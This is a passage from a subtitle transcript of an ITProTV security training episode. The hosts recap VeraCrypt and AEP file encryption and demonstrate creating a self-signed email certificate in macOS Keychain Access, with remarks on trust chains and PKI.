volume.\n\n326\n00:14:35.015 --> 00:14:36.400\n>> Mm-hm.\n>> And then actually use a tool like\n\n327\n00:14:36.400 --> 00:14:39.660\nVeraCrypt to mount it, put stuff in, and\nthen dismount to be able to store it.\n\n328\n00:14:39.660 --> 00:14:42.010\nAgain, we could bury that somewhere,\npotentially hide it somewhere so\n\n329\n00:14:42.010 --> 00:14:42.870\npeople wouldn't know it's there.\n\n330\n00:14:42.870 --> 00:14:44.440\n>> Right.\n>> We also took a look at how\n\n331\n00:14:44.440 --> 00:14:47.388\nto use AEP to be able to\ncreate encrypted files.\n\n332\n00:14:47.388 --> 00:14:48.590\n>> Mm-hm.\n>> Specifically writing,\n\n333\n00:14:48.590 --> 00:14:49.735\njust leave them around.\n\n334\n00:14:49.735 --> 00:14:52.025\n>> It also looks like it's portable,\nif I really wanted to,\n\n335\n00:14:52.025 --> 00:14:54.845\nI could take this to another machine,\nas long as I had that program.\n\n336\n00:14:54.845 --> 00:14:55.613\n>> Absolutely.\n\n337\n00:14:55.613 --> 00:14:58.325\n>> And decrypt it on a different machine.\n\n338\n00:14:58.325 --> 00:15:00.150\n>> You could, or mount it and use it.\n\n339\n00:15:00.150 --> 00:15:01.880\n>> Really cool.\n>> It is totally portable, absolutely.\n\n340\n00:15:01.880 --> 00:15:06.390\nSo the last thing we're gonna have you do\nis self signed certificate on the Mac.\n\n341\n00:15:06.390 --> 00:15:07.080\n>> Good old Mac.\n\n342\n00:15:07.080 --> 00:15:10.230\n>> I'm actually gonna let Mike\nnarrate on this one cause I can't see\n\n343\n00:15:10.230 --> 00:15:11.950\nwhat he's doing cause\nthe screen is too far away.\n\n344\n00:15:11.950 --> 00:15:14.310\nSo Mike is gonna tell us what\nhe's gonna do on the Mac.\n\n345\n00:15:14.310 --> 00:15:16.780\n>> So basically all I've done is\nI've gone into the key chain, and\n\n346\n00:15:16.780 --> 00:15:18.100\nif you have a Mac you're\nfamiliar with this.\n\n347\n00:15:18.100 --> 00:15:22.530\nThis is where stores all of your,\nit can store certificates, obviously,\n\n348\n00:15:22.530 --> 00:15:26.240\nfrom people that you've gathered\ntheir public keys from, or\n\n349\n00:15:26.240 --> 00:15:29.610\ncertificates you've created or\nchosen to trust.\n\n350\n00:15:29.610 --> 00:15:33.020\nLike your mail service certificate, or\nwhat have you, company certificates.\n\n351\n00:15:33.020 --> 00:15:35.680\nBut if I wanna create\na self sign certificate,\n\n352\n00:15:35.680 --> 00:15:39.060\nsimply gonna go up to my\nKeychain Access menu, and\n\n353\n00:15:39.060 --> 00:15:43.560\nthen Certificate Assistance, and\nthen choose Create a Certificate.\n\n354\n00:15:43.560 --> 00:15:46.642\nSo maybe I'm in an environment\nwhere we don't have a PKI, but\n\n355\n00:15:46.642 --> 00:15:50.849\nI want to digitally sign emails between me\nand a colleague, or something like that,\n\n356\n00:15:50.849 --> 00:15:53.243\nso we're gonna use self\nsigned certificates.\n\n357\n00:15:53.243 --> 00:15:57.821\nYou simply come in here, there's\nthe create your certificate wizard.\n\n358\n00:15:57.821 --> 00:16:01.952\nI would give it a name\nChoose Self Signed cuz there is no root,\n\n359\n00:16:01.952 --> 00:16:04.560\nthere's no higher authority.\n\n360\n00:16:04.560 --> 00:16:08.490\nWhat the certificate is for, and that's\ngonna put the purpose in that certificate.\n\n361\n00:16:08.490 --> 00:16:11.230\nYou get several to choose from or\nyou could do custom.\n\n362\n00:16:11.230 --> 00:16:14.620\nI'll simply do an email one,\npretty straightforward here.\n\n363\n00:16:14.620 --> 00:16:17.420\nAnd I will click Create.\n\n364\n00:16:17.420 --> 00:16:20.350\nAnd then it warns me this is\na self-signed certificate.\n\n365\n00:16:20.350 --> 00:16:22.350\nDoesn't give me that\nsame sense of security.\n\n366\n00:16:22.350 --> 00:16:27.200\nThere is no chain of trust back up to\na trusted root or anything like that.\n\n367\n00:16:27.200 --> 00:16:31.930\nI'll click Continue and it'll generate\nthe certificate and that's all there is.\n\n368\n00:16:31.930 --> 00:16:35.410\nIf we look at the details I can\nsee the subject information is\n\n369\n00:16:35.410 --> 00:16:37.955\nall the stuff that I\nfilled in in that form.\n\n370\n00:16:37.955 --> 00:16:40.180\nIn this case just my name.\n\n371\n00:16:40.180 --> 00:16:44.665\nChoose SHA-256 with RSA for\nthe signature algorithm.\n\n372\n00:16:44.665 --> 00:16:48.650\nI can see the validity period for\nthat, a using RSA for\n\n373\n00:16:48.650 --> 00:16:51.220\nthe public key, algorithm 256 bits.\n\n374\n00:16:52.690 --> 00:16:53.930\nA if we scroll down down,\n\n375\n00:16:53.930 --> 00:16:59.730\ndown at the bottom is the actual\nhash values the SHA1 and the MD5.\n\n376\n00:16:59.730 --> 00:17:01.760\nSo that's it.\n\n377\n00:17:01.760 --> 00:17:07.490\nThat is my self-signed certificate\nbasically issued to Mike Rodrick.\n\n378\n00:17:07.490 --> 00:17:10.080\nSigned by or issued to Mike Rodrick.\n\n379\n00:17:10.080 --> 00:17:11.500\nIssued by Mike Rodrick.\n\n380\n00:17:11.500 --> 00:17:16.130\nSo I can in theory give this to Adam,\nbut when Adam's computer processes that\n\n381\n00:17:16.130 --> 00:17:19.700\ncertificate, it's gonna say hey,\nI don't trust the signature.\n\n382\n00:17:19.700 --> 00:17:22.710\nI don't trust the issuer\nof the certificate.\n\n383\n00:17:22.710 --> 00:17:26.750\nBut he could then choose to import that\ncertificate, add it to his trusted roots\n\n384\n00:17:26.750 --> 00:17:30.380\nand then from then on his system\nwould trust that certificate.\n\n385\n00:17:30.380 --> 00:17:35.140\nHe'd have to do that as a manual process,\nwhereas if we have a PKI set up within our\n\n386\n00:17:35.140 --> 00:17:39.580\norganization, most of our systems are\ngonna be configured through group policy\n\n387\n00:17:39.580 --> 00:17:42.660\nto trust that root CA and therefore\ntrust all the issued certificates.\n\n388\n00:17:42.660 --> 00:17:46.280\nSo this is a much more manual process for\na small shop, or\n\n389\n00:17:46.280 --> 00:17:49.950\nwhen you wanna do something outside of\nyour company's public infrastructure.\n\n390\n00:17:49.950 --> 00:17:50.710\n>> Cool, very good.\n\n391\n00:17:50.710 --> 00:17:53.990\nWe appreciate that very insightful and\n\n392\n00:17:53.990 --> 00:17:55.160\ninteresting look\n>> [LAUGH]\n\n393\n00:17:55.160 --> 00:17:55.672\n>> At how we do that.\n\n394\n00:17:55.672 --> 00:17:56.699\nAnd that's actually kind of cool,\n\n395\n00:17:56.699 --> 00:17:59.750\ncuz you know as I said we don't\ntend to spend as much time\n\n396\n00:17:59.750 --> 00:18:01.470\noperating on some of these platforms.\n\n397\n00:18:01.470 --> 00:18:02.660\nA lot of administrators,\n\n398\n00:18:02.660 --> 00:18:05.730\na lot security professionals\nare very proficient at Windows.\n\n399\n00:18:05.730 --> 00:18:08.380\nMay very well be proficient in Unix and\nLinux.\n\n400\n00:18:08.380 --> 00:18:11.950\nAnd while I'm not suggesting for a minute\nthat people don't use Macs, it's not\n\n401\n00:18:11.950 --> 00:18:16.360\nthe first go-to machine you often think\nof when we think of network security.\n\n402\n00:18:16.360 --> 00:18:19.320\nAnd so it's nice to see some of that\nstuff done on these alternate platforms\n\n403\n00:18:19.320 --> 00:18:20.200\nfrom time to time.\n\n404\n00:18:20.200 --> 00:18:23.380\nI think it adds a lot of value in\nthe kind of stuff we're looking to do and\n\n405\n00:18:23.380 --> 00:18:26.250\npotentially gives us its slightly\ndifferent view of the world but shows\n\n406\n00:18:26.250 --> 00:18:30.750\nus also at the same time that things are,\nas much as they change, also very similar.\n\n407\n00:18:30.750 --> 00:18:33.510\nThe concept of self-signing\ncertificates is ubiquitous.\n\n408\n00:18:33.510 --> 00:18:34.430\nIt's available everywhere.\n\n409\n00:18:34.430 --> 00:18:36.580\nIt doesn't matter what\nplatform we're using.\n\n410\n00:18:36.580 --> 00:18:40.590\nThe specific steps, in fact we use\nan app called Keychain versus going into\n\n411\n00:18:40.590 --> 00:18:44.980\nthe certificate MMC in Windows to be\nable to go in and do that from there.\n\n412\n00:18:44.980 --> 00:18:48.810\nOr in Linux and Unix, we go into the\ncertificate store and be able to go in and\n\n413\n00:18:48.810 --> 00:18:53.490\nuse one of the certificate tools,\nyou know, a tool like Certutil in Windows,\n\n414\n00:18:53.490 --> 00:18:57.305\nthe command line equivalent of that In\nthe Linux world, to be able to go in and\n\n415\n00:18:57.305 --> 00:19:00.560\nto manipulate certificates is\nreally just a matter of what we're\n\n416\n00:19:00.560 --> 00:19:03.470\ndoing in terms of the nuts and\nbolts, the options and the tools.\n\n417\n00:19:03.470 --> 00:19:04.570\nBut the concept's the same.\n\n418\n00:19:04.570 --> 00:19:07.040\nCertificate's a certificate,\nregardless of platform.\n\n419\n00:19:07.040 --> 00:19:08.780\nIt's nice to be able to see that.\n\n420\n00:19:08.780 --> 00:19:11.330\nJust a refreshing different look\nat some of the stuff that we often\n\n421\n00:19:11.330 --> 00:19:11.990\nwe take for granted.\n\n422\n00:19:11.990 --> 00:19:13.680\nSo appreciate that, thank you very much.\n\n423\n00:19:13.680 --> 00:19:15.010\n>> No problem.\nWe can't leave Apple out of\n\n424\n00:19:15.010 --> 00:19:15.910\nthe whole thing, right?\n\n425\n00:19:15.910 --> 00:19:16.649\n>> No, no.\nWe gotta put them in there somewhere.\n\n426\n00:19:16.649 --> 00:19:19.133\n>> We gotta give them their time, so-\n>> Absolutely.\n\n427\n00:19:19.133 --> 00:19:20.150\n>> All right, Adam.\n\n428\n00:19:20.150 --> 00:19:20.990\nWell, we appreciate that.\n\n429\n00:19:20.990 --> 00:19:23.440\nSome great demonstrations\nthere on encryption,\n\n430\n00:19:23.440 --> 00:19:27.080\na look at a couple of different tools\nwe could use to do some hashing with.\n\n431\n00:19:27.080 --> 00:19:28.290\nWe looked at that Mac hash.\n\n432\n00:19:28.290 --> 00:19:30.080\nI think that one might have\nbeen in the previous episode.\n\n433\n00:19:30.080 --> 00:19:30.980\n>> That was, that was.\n>> And\n\n434\n00:19:30.980 --> 00:19:34.060\nthen in this one we looked at\nthat advanced encryption package\n\n435\n00:19:34.060 --> 00:19:38.950\nas well as VeraCrypt If we wanna do full\ndrive or entire volume encryption there.\n\n436\n00:19:38.950 --> 00:19:42.160\nAnd then rounded it off with a little\nlook at some of those certificates and\n\n437\n00:19:42.160 --> 00:19:44.530\ngenerating your own\nself-signed certificate.\n\n438\n00:19:44.530 --> 00:19:46.170\nSo we thank you for that,\nAdam, appreciate it.\n\n439\n00:19:46.170 --> 00:19:46.930\n>> Yup.\n>> Hope everybody\n\n440\n00:19:46.930 --> 00:19:48.310\nout there enjoyed watching.\n\n441\n00:19:48.310 --> 00:19:51.450\n>> Signing off for ITProTV,\nI've been your host Mike Rodrick.\n\n442\n00:19:51.450 --> 00:19:53.105\n>> I am a key chain.\n\n443\n00:19:53.105 --> 00:19:54.535\n>> [LAUGH]\n>> Here's my key.\n\n444\n00:19:54.535 --> 00:19:56.820\n>> [LAUGH] And we'll see-\n>> Here's my chain.\n\n445\n00:19:56.820 --> 00:19:59.712\nJoin the two together,\nyou get a key chain.\n\n446\n00:19:59.712 --> 00:20:08.180\n[MUSIC]\n\n",
